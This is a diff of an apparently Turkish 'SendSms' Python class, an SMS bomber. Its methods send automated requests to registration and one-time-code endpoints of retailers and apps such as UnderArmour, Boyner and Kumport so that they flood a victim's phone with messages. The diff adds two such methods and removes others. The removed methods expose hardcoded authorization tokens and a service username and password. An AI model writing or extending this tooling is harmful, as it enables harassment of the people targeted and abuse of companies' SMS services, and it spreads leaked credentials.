@@ -20,6 +20,34 @@ class SendSms():
 
 
 
+    #underarmour.com.tr by ever0ne
+    def UnderArmour(self):
+        try:
+            underarmour = requests.post("https://www.underarmour.com.tr/users/register/", 
+                                   headers={"User-Agent":"okhttp/4.10.0"},  
+                                   json={"first_name": "ahmet","last_name": "bilen","email": self.mail,"password": "asd12Assss","phone": f"0{self.phone}","confirm": "true","sms_allowed": "true","email_allowed": "false","call_allowed": "false"})
+            if underarmour.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> UnderArmour by ever0ne")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> UnderArmour by ever0ne")
+
+    #mobileapi-redesign.boyner.com.tr by ever0ne
+    def Boyner(self):
+        try:
+            boyner = requests.post("https://mobileapi-redesign.boyner.com.tr/mobile2/mbUser/RegisterUser", 
+                                   headers={"User-Agent":"okhttp/4.10.0"},  
+                                   json={"Main": {"CellPhone": self.phone,"Email": self.mail,"firstname": "ahmet","GenderID": 0,"lastname": "bilen","password": "asd21s","ReceiveCampaignMessages": "false"}})
+            if boyner.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Boyner by ever0ne")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Boyner by ever0ne")
+
     #mobileapp.lcwaikiki.com by ever0ne
     def LcWaikiki(self):
         try:
@@ -46,22 +74,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kunduz by ever0ne")
-
-
-    #kahvedunyasi.com
-    def KahveDunyasi(self):    
-        try:    
-            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
-                "mobile_number": self.phone,
-                "token_type": "register_token"
-            })
-            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
-                self.adet += 1
-            else:
-                raise
-        except:    
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
         
      
     #wmf.com.tr
@@ -234,21 +246,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")
-
-
-    #heyscooter.com.tr
-    def Hey(self):
-        try:
-            url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
-            headers = {"Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
-            r = requests.post(url, headers=headers)
-            if r.json()["IsSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")
 
     #bineq.tech
     def Bineq(self):
@@ -471,21 +468,6 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> feature.metro-tr.com")
 
-
-    #kumport.com.tr
-    def Kumport(self):
-        try:
-            url = f"https://online.kumport.com.tr:443/Api/Client/CallApi?action=kumport/User/SendSmsCodeToUser?phoneNumber={self.phone}_AND_ip="
-            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Xsrf-Token": "dLW-gyiEuXVAX42kxdgccFjrCuCklM_ZqvwfzTtUEinJ5QA_54MJ4jI71JG_YzEgzNWtKtRuIB9OmCWiz4QKvTlO-FDTsPwS2tYpG4AxPno1", "Dnt": "1", "Referer": "https://online.kumport.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
-            r = requests.get(url, headers=headers, verify=False)
-            if r.text.replace("\"", "").split(",")[1].split(":")[1].lower() == "true":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> online.kumport.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> online.kumport.com.tr")
-
     
     #qumpara.com
     def Qumpara(self):
@@ -677,21 +659,6 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> service.taksim.digital")
     
     
-    #vakiftasdelensu.com
-    def Tasdelen(self):
-        try:
-            url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend"
-            json= {"PhoneNumber": self.phone, "user": {"Password": "Aa123!35@1","UserName": "MobilOperator"}}
-            r = requests.post(url=url, json=json)
-            if r.json()["Result"]== True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 94.102.66.162:80")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 94.102.66.162:80")
-    
-    
     #tasimacim.com
     def Tasimacim(self):
         try:
@@ -705,38 +672,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> server.tasimacim.com")
-    
-    
-    #toptanteslim.com
-    def ToptanTeslim(self):
-        try:
-            url = "https://tt.etic.com.tr:443/api/setCustomer"
-            headers = {"authorization": "Basic dG9wdGFudGVzbGltOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm"}
-            data = {"telephone": f"0{self.phone}","name": "Memati","surname": "Bas","email": self.mail,"password": "313131","password_confirmation": "313131"}
-            r = requests.post(url=url, data=data, headers=headers)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tt.etic.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tt.etic.com.tr")
-    
-
-    #unilever.com.tr
-    def Unilever(self):
-        try:
-            url = "https://www.siparisdirekt.com/customer/otp/sendotp"
-            data = {"mobile": self.phone, "prefix": "+90"}
-            headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest"}
-            r = requests.post(url=url, headers=headers, data=data)
-            if r.json()["status"] == 1:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> siparisdirekt.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> siparisdirekt.com")
 
 
     #uysalmarket.com.tr
@@ -799,3 +734,4 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")
         
+
